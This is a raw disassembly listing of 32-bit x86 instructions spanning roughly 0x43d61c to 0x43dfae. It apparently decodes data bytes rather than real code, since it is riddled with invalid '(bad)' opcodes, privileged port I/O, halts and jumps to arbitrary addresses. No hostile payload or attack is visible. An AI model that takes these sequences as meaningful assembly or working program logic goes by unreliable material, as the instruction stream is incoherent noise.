  43d61c:	xchg   esi,eax
  43d61d:	fdiv   st,st(4)
  43d61f:	(bad)  
  43d621:	dec    ebp
  43d622:	jno    0x43d685
  43d624:	test   BYTE PTR [eax],al
  43d626:	hlt    
  43d627:	fisttp DWORD PTR [ebp-0x7b]
  43d62a:	cmp    dh,BYTE PTR [esi+ecx*2+0x5c]
  43d62e:	xor    ebp,DWORD PTR [ecx]
  43d630:	push   esp
  43d631:	add    ah,dh
  43d633:	(bad)  
  43d635:	shl    BYTE PTR [edx+0x417],0x0
	...
  43d650:	add    BYTE PTR [eax],al
  43d652:	add    ah,dh
  43d654:	fucom  st(5)
  43d656:	into   
  43d657:	out    dx,al
  43d658:	(bad)  
  43d659:	inc    DWORD PTR [ebp+0x7dbdcbac]
  43d65f:	mov    al,0xbe
  43d661:	add    bh,0x3
  43d664:	push   edx
  43d665:	les    edx,FWORD PTR [edi-0x789bd783]
  43d66b:	sub    al,BYTE PTR [edx]
  43d66d:	mov    edi,DWORD PTR [edi+0x4c2011a]
  43d673:	hlt    
  43d674:	cmp    eax,edx
  43d676:	int3   
  43d677:	mov    eax,0xb0ccd022
  43d67c:	mov    cl,0x8c
  43d67e:	in     al,dx
  43d67f:	inc    edx
  43d680:	arpl   WORD PTR [ecx+0x8],si
  43d683:	jns    0x43d6b5
  43d685:	jno    0x43d68f
  43d687:	jns    0x43d631
  43d689:	fwait
  43d68a:	pop    edx
  43d68b:	and    DWORD PTR [eax+ecx*1],ebx
  43d68e:	add    BYTE PTR [edi-0x58],ch
  43d691:	pop    ebp
  43d692:	add    eax,0x768b04ba
  43d697:	repnz lods al,BYTE PTR ds:[esi]
  43d699:	jnp    0x43d69c
  43d69b:	pop    esi
  43d69c:	lock mov cl,0x5e
  43d69f:	call   0x9a2c:0xa68ce709
  43d6a6:	mov    esi,cs
  43d6a8:	xor    BYTE PTR [eax-0x2],ch
  43d6ab:	cmp    eax,0xc703e7f0
  43d6b0:	or     BYTE PTR [ecx+eax*1-0x57],ah
  43d6b4:	movd   mm1,DWORD PTR [ecx+0x0]
	...
  43d6d0:	les    edi,FWORD PTR [ebx+0x29]
  43d6d3:	pop    eax
  43d6d4:	mov    eax,ds:0x2b84e8c4
  43d6d9:	add    eax,0xff87c60e
  43d6de:	std    
  43d6df:	rol    BYTE PTR [edi+0x60bc19fb],1
  43d6e5:	lock mov dl,0x0
  43d6e8:	lahf   
  43d6e9:	push   ecx
  43d6ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43d6eb:	pop    es
  43d6ec:	hlt    
  43d6ed:	jnp    0x43d760
  43d6ef:	mov    bl,0xf4
  43d6f1:	add    al,0xe7
  43d6f3:	add    al,0x6e
  43d6f5:	mov    al,ds:0x7bf403e7
  43d6fa:	jno    0x43d6a7
  43d6fc:	hlt    
  43d6fd:	add    al,0xe7
  43d6ff:	ins    DWORD PTR es:[edi],dx
  43d700:	hlt    
  43d701:	pop    edx
  43d702:	out    0x8e,eax
  43d704:	cmp    BYTE PTR [esi],dl
  43d706:	rol    DWORD PTR [edx],0x36
  43d709:	dec    ebp
  43d70a:	std    
  43d70b:	add    ebx,DWORD PTR [edx]
  43d70d:	add    eax,0x5485966
  43d712:	dec    cx
  43d714:	inc    esp
  43d715:	push   es
  43d716:	mov    ebp,0x66051203
  43d71b:	pop    ecx
  43d71c:	sub    BYTE PTR ds:0x4ac9174,al
  43d722:	out    0x3,eax
  43d724:	xor    eax,DWORD PTR [edx+0x4775f00]
  43d72a:	add    cl,ch
  43d72c:	leave  
  43d72d:	mov    edx,eax
  43d72f:	adc    DWORD PTR [eax],eax
  43d731:	idiv   ecx
  43d733:	push   ds
	...
  43d74c:	add    BYTE PTR [eax-0x44],dh
  43d74f:	sub    eax,0x20c87029
  43d754:	fs ds std 
  43d757:	xchg   ebx,eax
  43d758:	sub    esp,edx
  43d75a:	xchg   edi,eax
  43d75b:	xchg   DWORD PTR [edi-0x72ad7829],esp
  43d761:	push   0x398c5aaf
  43d766:	or     BYTE PTR [eax],al
  43d768:	mov    ch,0x44
  43d76a:	ror    ah,0xad
  43d76d:	inc    esp
  43d76e:	ror    ah,0x3c
  43d771:	outs   dx,DWORD PTR ds:[esi]
  43d772:	loopne 0x43d6f9
  43d774:	and    al,0x0
  43d776:	mov    cl,BYTE PTR [ebx-0x27]
  43d779:	jbe    0x43d75b
  43d77b:	or     BYTE PTR [esi],dl
  43d77d:	(bad)  
  43d77e:	in     eax,dx
  43d77f:	xchg   ecx,esi
  43d781:	outs   dx,BYTE PTR ds:[esi]
  43d782:	inc    ebx
  43d783:	or     al,0x60
  43d785:	xor    BYTE PTR [esi+0x3678ed78],al
  43d78b:	test   DWORD PTR [edi],esi
  43d78d:	xor    al,dh
  43d78f:	xchg   ebx,eax
  43d790:	mov    cl,0xf0
  43d792:	add    al,0x0
  43d794:	bound  edi,QWORD PTR [edx]
  43d796:	inc    ecx
  43d797:	or     eax,0x5d46f
  43d79c:	jmp    0x1e74130f
  43d7a1:	and    BYTE PTR [edi],bh
  43d7a3:	dec    edi
  43d7a4:	pop    ss
  43d7a5:	mov    al,ds:0xf7e92df3
  43d7aa:	outs   dx,DWORD PTR ds:[esi]
  43d7ab:	(bad)  
  43d7ac:	cmc    
  43d7ad:	ins    BYTE PTR es:[edi],dx
  43d7ae:	lds    esi,FWORD PTR [ecx+eiz*8+0x0]
	...
  43d7ca:	jbe    0x43d789
  43d7cc:	stc    
  43d7cd:	scas   al,BYTE PTR es:[edi]
  43d7ce:	jle    0x43d7b2
  43d7d0:	pop    ebx
  43d7d1:	add    dh,bl
  43d7d3:	jns    0x43d813
  43d7d5:	xor    BYTE PTR [eax],dl
  43d7d7:	dec    esp
  43d7d8:	cld    
  43d7d9:	push   edx
  43d7da:	push   ss
  43d7db:	mov    edi,0xee2e29e8
  43d7e0:	test   DWORD PTR [ebx-0x3f8302e7],0xcf7afd89
  43d7ea:	add    bl,dl
  43d7ec:	push   es
  43d7ed:	add    DWORD PTR [eax+0x5e4b50ee],0x2057406
  43d7f7:	nop
  43d7f8:	idiv   edi
  43d7fa:	inc    edx
  43d7fb:	xchg   ebp,eax
  43d7fc:	cmp    eax,0x3e7b8dfc
  43d801:	xor    BYTE PTR [esi+0x3fa1e8bf],ah
  43d807:	out    dx,eax
  43d808:	test   DWORD PTR [ebx-0x3f82f9b7],0xcf7b01a9
  43d812:	xor    bh,BYTE PTR [ebx+0x3e]
  43d815:	xor    BYTE PTR [eax-0x69ae07ac],dl
  43d81b:	mov    edi,0xeeaf89e8
  43d820:	test   DWORD PTR [ebx-0x3f82fa67],0xcf7b0209
  43d82a:	cmp    BYTE PTR [edx+0x3e],0x30
	...
  43d846:	add    BYTE PTR [eax],dh
  43d848:	dec    ebp
  43d849:	cld    
  43d84a:	push   edx
  43d84b:	inc    esi
  43d84c:	shr    al,0x71
  43d84f:	aas    
  43d850:	out    dx,eax
  43d851:	test   DWORD PTR [ebx-0x3f82fa77],0xcf7afca9
  43d85b:	adc    bl,bl
  43d85d:	sbb    al,BYTE PTR [ebp-0x74e992be]
  43d863:	hlt    
  43d864:	pop    ebp
  43d865:	mov    DWORD PTR [eax],eax
  43d867:	hlt    
  43d868:	fstp   TBYTE PTR [ebx+eax*2]
  43d86b:	mov    BYTE PTR [eax-0x484b7cf5],dh
  43d871:	or     bh,BYTE PTR [ebp+0x7c]
  43d874:	out    0x71,eax
  43d876:	push   es
  43d877:	ja     0x43d8ac
  43d879:	add    eax,0x9c66f174
  43d87e:	stc    
  43d87f:	arpl   WORD PTR [esi],cx
  43d881:	nop
  43d882:	inc    ebx
  43d883:	pop    eax
  43d884:	stos   DWORD PTR es:[edi],eax
  43d885:	xchg   BYTE PTR [edx+0x4],al
  43d888:	arpl   bx,cx
  43d88a:	call   0xfa3fc1f0
  43d88f:	ja     0x43d8b8
  43d891:	add    DWORD PTR [ebx+0x7cfe6f34],eax
  43d897:	inc    ebx
  43d898:	fiadd  WORD PTR [edi+0x4978e442]
  43d89e:	cld    
  43d89f:	(bad)  
  43d8a0:	sub    al,0x87
  43d8a2:	retf   0x570c
  43d8a5:	out    dx,al
  43d8a6:	stc    
  43d8a7:	adc    esp,DWORD PTR [ecx+0x59]
  43d8aa:	clc    
	...
  43d8c3:	add    BYTE PTR [edi-0x61],dh
  43d8c6:	or     BYTE PTR [ebx+0x7d013734],al
  43d8cc:	sub    esi,DWORD PTR [esi-0x6486e819]
  43d8d2:	jno    0x43d8e7
  43d8d4:	jg     0x43d8ff
  43d8d6:	add    BYTE PTR [esi],dh
  43d8d8:	mov    dh,BYTE PTR [edx+0x4]
  43d8db:	add    ah,dh
  43d8dd:	or     DWORD PTR [esi],eax
  43d8df:	repnz mov bh,0xe6
  43d8e2:	jb     0x43d8e7
  43d8e4:	mov    esp,DWORD PTR [ebp-0x5]
  43d8e7:	stc    
  43d8e8:	ret    
  43d8e9:	pop    ecx
  43d8ea:	inc    ecx
  43d8eb:	cld    
  43d8ec:	and    al,0x67
  43d8ee:	inc    edx
  43d8ef:	xor    BYTE PTR [edi-0x74],bh
  43d8f2:	in     al,dx
  43d8f3:	inc    edx
  43d8f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43d8f5:	add    eax,0xc121fd62
  43d8fa:	jecxz  0x43d882
  43d8fc:	mov    ah,0x71
  43d8fe:	in     al,dx
  43d8ff:	cmp    BYTE PTR [ebp+0x712c3eec],0x3a
  43d906:	inc    ebx
  43d907:	or     DWORD PTR [ebx+0x7723b3ec],0x211fbcec
  43d911:	(bad)
  43d914:	mov    WORD PTR ds:0xfce703e7,es
  43d91a:	fld    QWORD PTR [ebp+0x3e70578]
  43d920:	enter  0x10fe,0xc1
  43d924:	cld    
  43d925:	jno    0x43d913
  43d927:	mov    esp,0x0
	...
  43d940:	add    BYTE PTR [ebx-0x14],ch
  43d943:	cli    
  43d944:	cld    
  43d945:	jno    0x43d98a
  43d947:	mov    bh,0x8e
  43d949:	mov    edi,0x3e8898e8
  43d94e:	fucomp st(3)
  43d950:	icebp  
  43d951:	sbb    eax,0xf0c766ec
  43d956:	and    DWORD PTR [edi-0x65780889],0x6e1d11fc
  43d960:	dec    esi
  43d961:	add    BYTE PTR [eax+0x2480fcc0],cl
  43d967:	ins    BYTE PTR es:[edi],dx
  43d968:	cld    
  43d969:	addr16 or esi,esi
  43d96c:	ret    
  43d96d:	and    DWORD PTR [ebx+0x47],edi
  43d970:	add    esi,esp
  43d972:	add    al,0x14
  43d974:	or     al,0x21
  43d976:	or     DWORD PTR [ebx+0x3],0xfffffff4
  43d97a:	add    al,0x13
  43d97c:	or     al,dh
  43d97e:	(bad)  
  43d97f:	out    dx,eax
  43d980:	jbe    0x43d979
  43d982:	stos   DWORD PTR es:[edi],eax
  43d983:	pusha  
  43d984:	cld    
  43d985:	mov    ebp,0x396200eb
  43d98a:	xor    eax,0x3aa8148b
  43d98f:	test   DWORD PTR [edi],esi
  43d991:	(bad)
  43d995:	cwde   
  43d996:	sbb    DWORD PTR [ebx+0x51],0x6404c074
  43d99d:	mov    bh,0x70
  43d99f:	add    ebp,DWORD PTR [edx-0x50]
  43d9a2:	in     eax,dx
  43d9a3:	in     eax,0xd8
	...
  43d9bd:	add    BYTE PTR [edx-0x13],dh
  43d9c0:	jae    0x43d9a6
  43d9c2:	sub    al,0x8f
  43d9c4:	test   al,0xe9
  43d9c6:	test   DWORD PTR [esp+esi*2],0xf993a0ec
  43d9cd:	push   ds
  43d9ce:	pop    eax
  43d9cf:	add    DWORD PTR [ebx-0x1f],0xa48b0cf6
  43d9d6:	dec    edi
  43d9d7:	push   esp
  43d9d8:	test   DWORD PTR [edi+0x11ca8207],ebp
  43d9de:	or     ah,bl
  43d9e0:	stc    
  43d9e1:	div    BYTE PTR [ebx+0x376404c0]
  43d9e7:	jo     0x43d9e6
  43d9e9:	imul   ebp,DWORD PTR [edi],0xec2485ed
  43d9ef:	adc    DWORD PTR [ebx-0x7],0x6efdc3ca
  43d9f6:	sub    BYTE PTR [eax+eax*1],al
  43d9f9:	jmp    0xea2058e8
  43d9fe:	test   DWORD PTR [edi*2-0x3097f156],0x870d78e9
  43da09:	xor    esp,esi
  43da0b:	jg     0x43da50
  43da0d:	mov    eax,ds:0x60083e6b
  43da12:	cli    
  43da13:	jmp    0xc4bf0c18
  43da18:	pop    ecx
  43da19:	add    BYTE PTR [esi-0x1c],al
  43da1c:	push   ebp
  43da1d:	ret    
  43da1e:	mov    DWORD PTR [ebp+0xcccc],edi
	...
  43da38:	add    BYTE PTR [eax],al
  43da3a:	add    BYTE PTR [eax],dl
  43da3c:	jp     0x43da2a
  43da3e:	sub    DWORD PTR [ecx],0x15
  43da41:	add    DWORD PTR [ebp-0x5b],0x33
  43da45:	retf   0x6089
  43da48:	repnz xor eax,edx
  43da4b:	mov    al,0xf9
  43da4d:	test   BYTE PTR [edx+0x7],al
  43da50:	jp     0x43da2f
  43da52:	pop    ebp
  43da53:	iret   
  43da54:	cld    
  43da55:	call   DWORD PTR [ebp+0x6]
  43da58:	mov    cl,0xe0
  43da5a:	add    BYTE PTR [ebp+0x6],bl
  43da5d:	xor    esi,edx
  43da5f:	mov    al,ds:0x1a9ab802
  43da64:	out    dx,al
  43da65:	neg    DWORD PTR [esi-0x1a]
  43da68:	jecxz  0x43dabf
  43da6a:	ret    0x659
  43da6d:	xor    DWORD PTR [esi],edx
  43da6f:	pusha  
  43da70:	add    bh,BYTE PTR [eax-0x8120564]
  43da76:	pop    esi
  43da77:	(bad)  
  43da78:	jecxz  0x43dacf
  43da7a:	ret    0x619
  43da7d:	dec    ebx
  43da7e:	mov    edi,DWORD PTR [eax+0x16]
  43da81:	xor    ebx,edx
  43da83:	sar    dl,0x52
  43da86:	xor    ecx,DWORD PTR [ebp+0x4c]
  43da89:	and    ebp,0xffffffc8
  43da8c:	ret    0xc
  43da8f:	xchg   esi,eax
  43da90:	inc    esp
  43da91:	or     al,0x89
  43da93:	rcl    DWORD PTR [eax],cl
  43da95:	sbb    DWORD PTR [esi+0x21],0xdd848e2b
  43da9c:	add    eax,0x7200
	...
  43dab5:	add    BYTE PTR [eax],al
  43dab7:	add    dh,al
  43dab9:	jbe    0x43dac3
  43dabb:	cmp    edi,DWORD PTR [ebx-0x7b]
  43dabe:	add    BYTE PTR [eax],al
  43dac0:	int    0x73
  43dac2:	or     DWORD PTR [ecx],edi
  43dac4:	hlt    
  43dac5:	imul   eax,ebp,0x70dbf400
  43dacb:	pop    es
  43dacc:	outs   dx,DWORD PTR ds:[esi]
  43dacd:	jno    0x43db4c
  43dacf:	add    ah,dh
  43dad1:	fisttp DWORD PTR [edx+ecx*2+0x7a890b08]
  43dad8:	cld    
  43dad9:	scas   al,BYTE PTR es:[edi]
  43dada:	mov    ebp,0x47deb385
  43dadf:	js     0x43dae8
  43dae1:	mov    ds:0xcda43571,al
  43dae6:	psllw  mm0,0x16
  43daea:	(bad)  [edx-0x1c]
  43daed:	add    al,0x8e
  43daef:	enter  0xdbf4,0xfd
  43daf3:	jae    0x43daf1
  43daf5:	dec    di
  43daf7:	js     0x43daf0
  43daf9:	adc    cl,BYTE PTR [edx+edx*2+0x14775f08]
  43db00:	hlt    
  43db01:	fidivr DWORD PTR [edi-0x50]
  43db04:	cmc    
  43db05:	(bad)  
  43db07:	jl     0x43dad3
  43db09:	jecxz  0x43db08
  43db0b:	or     BYTE PTR [ecx+0x66],bh
  43db0e:	std    
  43db0f:	push   esp
  43db11:	jbe    0x43db52
  43db13:	jl     0x43db94
  43db15:	mov    eax,ds:0x70348375
  43db1a:	add    eax,0x83
	...
  43db33:	add    BYTE PTR [eax],al
  43db35:	sub    eax,0xf48779f2
  43db3a:	(bad)  
  43db3c:	mov    eax,0x41bf4
  43db41:	jno    0x43dade
  43db43:	outs   dx,DWORD PTR ds:[esi]
  43db44:	jbe    0x880d1821
  43db4a:	test   BYTE PTR [edx+edi*2+0x9f7596c],0x70
  43db52:	pusha  
  43db53:	std    
  43db54:	push   esp
  43db56:	add    al,0x6e
  43db58:	xor    BYTE PTR [ebp+eax*1+0x42d103e7],0x27
  43db60:	lea    edi,[esi-0x3f]
  43db63:	out    0x3,eax
  43db65:	hlt    
  43db66:	adc    esi,DWORD PTR [ecx]
  43db68:	inc    eax
  43db69:	jno    0x43dafa
  43db6b:	xor    eax,DWORD PTR [esp+esi*8]
  43db6e:	add    al,0xfd
  43db70:	add    edi,DWORD PTR [ebx]
  43db72:	push   ebp
  43db73:	adc    eax,0xe77d7687
  43db78:	add    esi,esp
  43db7a:	push   esp
  43db7b:	dec    edi
  43db7c:	jmp    0x852ae045
  43db81:	mov    al,0x11
  43db83:	fs (bad) 
  43db85:	in     eax,dx
  43db86:	and    DWORD PTR [edx+eax*1+0xa6e04f4],0x47b8f79
  43db91:	hlt    
  43db92:	add    al,0x5e
  43db94:	sbb    BYTE PTR [eax+0x3e705],0x0
	...
  43dbaf:	add    BYTE PTR [eax],al
  43dbb1:	add    ch,al
  43dbb3:	push   ebp
  43dbb4:	outs   dx,BYTE PTR ds:[esi]
  43dbb5:	mov    al,BYTE PTR [eax-0x45fc18fb]
  43dbbb:	push   esp
  43dbbc:	or     dl,bl
  43dbbe:	rol    eax,0xd7
  43dbc1:	cmp    al,0x35
  43dbc3:	clc    
  43dbc4:	arpl   WORD PTR [ebx+esi*1],di
  43dbc7:	call   0x344a68b3
  43dbcc:	daa    
  43dbcd:	add    ebx,DWORD PTR [esi-0xfae8fbc]
  43dbd3:	jge    0x43dc2e
  43dbd5:	or     al,0x3
  43dbd7:	aas    
  43dbd8:	sub    ebp,DWORD PTR [ebx]
  43dbda:	mov    gs,WORD PTR [eax+esi*8+0x41]
  43dbde:	cmp    BYTE PTR [ebx+0x69],0xbb
  43dbe2:	hlt    
  43dbe3:	add    al,0xe7
  43dbe5:	jle    0x43db9b
  43dbe7:	idiv   edi
  43dbe9:	ins    BYTE PTR es:[edi],dx
  43dbea:	jg     0x43dbf0
  43dbec:	add    cl,ch
  43dbee:	js     0x43db9a
  43dbf0:	enter  0xf7e9,0x4
  43dbf4:	add    BYTE PTR [ecx*2-0x31a0796],dl
  43dbfb:	sbb    bh,0xe9
  43dbfe:	test   DWORD PTR [eax*4+0x4a81d82f],0x8ce721d9
  43dc09:	pop    ds
  43dc0a:	hlt    
  43dc0b:	xchg   DWORD PTR ss:[esp+eiz*4],esp
  43dc0f:	jg     0x43dc5c
  43dc11:	stc    
  43dc12:	pop    DWORD PTR [esi+0x15]
  43dc15:	jmp    0x43dc1a
	...
  43dc2e:	add    bh,dh
  43dc30:	jg     0x43dc75
  43dc32:	loope  0x43dc3e
  43dc34:	lds    edi,FWORD PTR [eax-0x24]
  43dc37:	js     0x43dca3
  43dc39:	sbb    al,0xe9
  43dc3b:	or     eax,DWORD PTR [esi]
  43dc3d:	shl    DWORD PTR [edi+edi*8+0x6c36f9eb],0x81
  43dc45:	pop    edx
  43dc46:	shr    DWORD PTR [eax],1
  43dc48:	lds    eax,FWORD PTR [ebp-0xb93f7de]
  43dc4e:	jb     0x43dc8f
  43dc50:	adc    DWORD PTR [edi-0x7aa33218],edi
  43dc56:	lahf   
  43dc57:	(bad)  
  43dc58:	jg     0x43dc9d
  43dc5a:	stc    
  43dc5b:	in     eax,0x42
  43dc5d:	ins    BYTE PTR es:[edi],dx
  43dc5e:	jb     0x43dc52
  43dc60:	adc    al,0x51
  43dc62:	cdq    
  43dc63:	(bad)  
  43dc64:	fcom   QWORD PTR [edi+0x2704f7ba]
  43dc6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43dc6b:	jo     0x43dc71
  43dc6d:	add    cl,ch
  43dc6f:	jle    0x43dcc4
  43dc71:	lock pusha 
  43dc73:	retf   0x1774
  43dc76:	ja     0x43dcec
  43dc78:	add    al,0x0
  43dc7a:	add    BYTE PTR ds:0x66f4551a,cl
  43dc80:	inc    esp
  43dc81:	or     BYTE PTR [ecx],al
  43dc83:	add    ch,ch
  43dc85:	jnp    0x43dc7f
  43dc87:	int3   
  43dc88:	push   esi
  43dc89:	jae    0x43dc10
  43dc8b:	lea    esi,[edx+esi*2-0x15]
  43dc8f:	out    0x79,al
  43dc91:	or     BYTE PTR ds:[eax],al
	...
  43dcac:	pop    eax
  43dcad:	shr    DWORD PTR [ebp+0x8],0x56
  43dcb1:	aas    
  43dcb2:	js     0x43dcbf
  43dcb4:	add    ebp,DWORD PTR [ebp+0x74]
  43dcb7:	outs   dx,WORD PTR es:[esi]
  43dcba:	adc    al,0x3b
  43dcbc:	and    eax,0x258afa73
  43dcc1:	xor    al,al
  43dcc3:	test   DWORD PTR [edx],edx
  43dcc5:	jne    0x43dcd5
  43dcc7:	jmp    0x43dc67
  43dcc9:	jge    0x43dd0c
  43dccb:	add    BYTE PTR [esi],dl
  43dccd:	aaa    
  43dcce:	add    al,0x8a
  43dcd0:	mov    DWORD PTR [edx],edx
  43dcd2:	or     DWORD PTR [esi-0x63],0x7a
  43dcd6:	adc    al,0x8
  43dcd8:	popf   
  43dcd9:	sub    edi,DWORD PTR [edi+0x3e79b272]
  43dcdf:	adc    dh,dl
  43dce1:	ds jo  0x43dd3b
  43dce4:	ds retf 
  43dce6:	stc    
  43dce7:	jge    0x43dd4e
  43dce9:	push   edx
  43dcea:	dec    ecx
  43dceb:	adc    DWORD PTR [ebx+0x1e29e85e],eax
  43dcf1:	add    al,BYTE PTR [eax]
  43dcf3:	sub    DWORD PTR [ebx+0x1d000080],esi
  43dcf9:	jns    0x43dd39
  43dcfb:	jo     0x43dd41
  43dcfd:	nop
  43dcfe:	test   BYTE PTR [eax],al
  43dd00:	or     eax,0x257e2102
  43dd05:	sbb    DWORD PTR [esi+0x14],esi
  43dd08:	sbb    al,0x70
  43dd0a:	adc    BYTE PTR [ecx],al
  43dd0c:	hlt    
  43dd0d:	dec    ebp
  43dd0e:	add    bh,bh
	...
  43dd28:	add    BYTE PTR [ecx-0x784fb0d],al
  43dd2e:	pop    edx
  43dd2f:	jae    0x43dd45
  43dd31:	hlt    
  43dd32:	(bad)  
  43dd33:	jp     0x43dd85
  43dd35:	jmp    0x5298:0x3985f2ae
  43dd3c:	push   ebp
  43dd3d:	cmp    dh,BYTE PTR [ebx-0x20]
  43dd40:	pop    ebx
  43dd41:	mov    dh,0xd7
  43dd43:	std    
  43dd44:	pop    eax
  43dd45:	das    
  43dd46:	retf   
  43dd47:	mov    ebp,0x58806f5a
  43dd4c:	mov    esi,0x5552dbe8
  43dd51:	ja     0x43dd06
  43dd53:	repnz pop edx
  43dd55:	jg     0x43ddcf
  43dd57:	pop    eax
  43dd58:	mov    esi,0xccc1dbf0
  43dd5d:	test   al,0x2f
  43dd5f:	ror    esp,0xc0
  43dd62:	pop    ss
  43dd63:	ror    esp,0xb8
  43dd66:	test   al,0x86
  43dd68:	in     al,dx
  43dd69:	daa    
  43dd6a:	scas   eax,DWORD PTR es:[edi]
  43dd6b:	xchg   BYTE PTR [ebx-0x14],bh
  43dd6e:	jmp    0x590c:0xb07383d6
  43dd75:	jns    0x43dd11
  43dd77:	xchg   edi,eax
  43dd78:	push   ebp
  43dd79:	rcr    DWORD PTR [ecx],0xf9
  43dd7c:	inc    ecx
  43dd7e:	jb     0x43dd2a
  43dd80:	loopne 0x43dd76
  43dd82:	(bad)  
  43dd84:	add    BYTE PTR [edx-0x78],0x7
  43dd88:	mov    edi,DWORD PTR [edx+0x595371]
	...
  43dda6:	lahf   
  43dda7:	mov    al,ds:0x72f404bf
  43ddac:	jnp    0x43dd2e
  43ddae:	hlt    
  43ddaf:	(bad)  
  43ddb1:	add    al,0x7a
  43ddb3:	pop    edi
  43ddb4:	std    
  43ddb5:	push   esp
  43ddb7:	add    al,0x5c
  43ddb9:	adc    ebx,ecx
  43ddbb:	xchg   BYTE PTR [edi+0x5c04f404],ch
  43ddc1:	or     DWORD PTR [ecx+0x36],edi
  43ddc4:	push   edi
  43ddc5:	cmp    DWORD PTR [esi+0x7f013b70],ebp
  43ddcb:	cmp    eax,0x37068952
  43ddd0:	cmp    eax,0x6fadd04
  43ddd5:	enter  0x519,0x66
  43ddd9:	sar    ah,0x87
  43dddc:	sbb    DWORD PTR [esp+edi*8-0x35],ecx
  43dde0:	jmp    0xe748d1e8
  43dde5:	outs   dx,BYTE PTR ds:[esi]
  43dde6:	repz xchg ecx,eax
  43dde8:	sub    DWORD PTR [eax],eax
  43ddea:	inc    esp
  43ddeb:	in     eax,dx
  43ddec:	pop    es
  43dded:	es hlt 
  43ddef:	add    al,0x19
  43ddf1:	push   0xfffffff4
  43ddf3:	retf   
  43ddf4:	and    DWORD PTR [esp+esi*8+0x4],ecx
  43ddf8:	out    0x3,eax
  43ddfa:	(bad)  
  43ddfb:	cli    
  43ddfc:	push   es
  43ddfd:	enter  0x4c9,0x66
  43de01:	shr    ah,0x42
  43de04:	and    bh,BYTE PTR [ebp-0x6c]
  43de07:	add    eax,0x3e7
	...
  43de20:	add    BYTE PTR [eax],al
  43de22:	add    ah,dh
  43de24:	add    al,0xe7
  43de26:	add    ecx,ebp
  43de28:	(bad)  
  43de29:	es pop ecx
  43de2b:	mov    edi,0x2803e3c6
  43de30:	shl    DWORD PTR [ebx],1
  43de32:	enter  0xd140,0x2b
  43de36:	enter  0xd138,0xbc
  43de3a:	mov    BYTE PTR [eax-0x7a],dl
  43de3d:	sti    
  43de3e:	pop    es
  43de3f:	cmp    esp,esp
  43de41:	out    0x50,eax
  43de43:	(bad)  
  43de44:	cmp    ebp,DWORD PTR [esi-0xe]
  43de47:	arpl   WORD PTR [eax],dx
  43de49:	add    cl,ch
  43de4b:	test   DWORD PTR [ebx+ecx*4],0xf9df242c
  43de52:	out    0x4,al
  43de54:	test   al,0x85
  43de56:	sub    al,0xf8
  43de58:	push   0x3
  43de5a:	cmp    BYTE PTR [ebx+0x78],bh
  43de5d:	hlt    
  43de5e:	iret   
  43de5f:	add    dh,bl
  43de61:	dec    esi
  43de62:	cli    
  43de63:	int3   
  43de64:	mov    eax,DWORD PTR [ebx-0x6221ef7]
  43de6a:	sar    DWORD PTR [edi+ebp*1],0x0
  43de6e:	jmp    0xadc1bc97
  43de73:	sti    
  43de74:	mov    eax,DWORD PTR [ebx-0x6223f3b]
  43de7a:	rol    BYTE PTR [eax-0xba07bf3],cl
  43de80:	add    al,0x0
  43de82:	sbb    DWORD PTR [ebx-0x79],edi
  43de85:	hlt    
  43de86:	jg     0x43de88
	...
  43dea0:	mov    al,ds:0xdc8150dd
  43dea5:	repz stc 
  43dea7:	outs   dx,BYTE PTR ds:[esi]
  43dea8:	ins    BYTE PTR es:[edi],dx
  43dea9:	repnz test DWORD PTR [ecx],esi
  43deac:	je     0x43de76
  43deae:	or     dl,dh
  43deb0:	mov    cl,0x8b
  43deb2:	inc    ebx
  43deb3:	dec    ebp
  43deb4:	clc    
  43deb5:	mov    BYTE PTR [edx-0x7afb0818],dl
  43debb:	pop    esp
  43debc:	adc    ebx,esi
  43debe:	stc    
  43debf:	ds mov eax,0x7a9b5036
  43dec5:	xchg   esp,esi
  43dec7:	das    
  43dec8:	pusha  
  43dec9:	fst    QWORD PTR [eax+0x2e]
  43decc:	adc    al,cl
  43dece:	(bad)  
  43decf:	call   0xa62be3cb
  43ded4:	sbb    DWORD PTR ds:0xf87b6a00,eax
  43deda:	add    BYTE PTR [eax],0xdd
  43dedd:	jae    0x43deda
  43dedf:	and    dh,0xd8
  43dee2:	add    DWORD PTR [ebp-0x827cf],0xffffffb8
  43dee9:	dec    edx
  43deea:	cld    
  43deeb:	push   ecx
  43deec:	mov    BYTE PTR [ebp-0x28d5010c],al
  43def2:	call   0xf81b1774
  43def7:	adc    DWORD PTR [ecx+0xc],0x7d
  43defb:	shl    BYTE PTR [ecx],0xa
  43defe:	jnp    0x43decb
  43df00:	stos   BYTE PTR es:[edi],al
  43df01:	bound  edi,QWORD PTR [ebp+0x24]
	...
  43df1c:	add    BYTE PTR [edx+0x8df7d6],ch
  43df22:	in     eax,0x4a
  43df24:	lea    ecx,[eax-0x23]
  43df27:	idiv   bh
  43df29:	push   0xffffffc1
  43df2b:	out    0xed,al
  43df2d:	push   0xffffffd6
  43df2f:	jnp    0x43def5
  43df31:	ror    DWORD PTR [ebp-0x74618b40],1
  43df37:	ret    
  43df38:	call   FWORD PTR [eax]
  43df3a:	dec    esp
  43df3b:	lock push eax
  43df3d:	push   ss
  43df3e:	mov    WORD PTR [edi+edi*8],fs
  43df41:	or     dl,dh
  43df43:	test   DWORD PTR [ebp-0x828cf],ecx
  43df49:	and    eax,0x2affecb6
  43df4e:	mov    al,ah
  43df50:	add    al,0x10
  43df52:	leave  
  43df53:	je     0x43df58
  43df55:	fisub  WORD PTR [ecx+0x2cd08bf7]
  43df5b:	idiv   edi
  43df5d:	sub    al,BYTE PTR [ebp+eax*2-0x7a7a8310]
  43df64:	hlt    
  43df65:	sbb    edx,esi
  43df67:	imul   eax
  43df69:	sbb    eax,0xf4fff7e5
  43df6e:	outs   dx,BYTE PTR ds:[esi]
  43df6f:	enter  0x7104,0x2c
  43df73:	js     0x43df72
  43df75:	jbe    0x43df8e
  43df77:	in     eax,dx
  43df78:	test   DWORD PTR [ecx-0x38],esi
  43df7b:	out    dx,al
  43df7c:	stc    
  43df7d:	and    ebp,DWORD PTR [ecx+0x57]
  43df80:	lock add BYTE PTR [eax],al
	...
  43df97:	add    BYTE PTR [eax],al
  43df99:	add    dh,al
  43df9b:	inc    eax
  43df9c:	jg     0x43df92
  43df9e:	adc    ch,bl
  43dfa0:	out    dx,al
  43dfa1:	call   0xfa32b09b
  43dfa6:	ja     0x43df58
  43dfa8:	add    DWORD PTR [ebx+0x7d013834],eax
  43dfae:	mov    edi,0xe04380ca
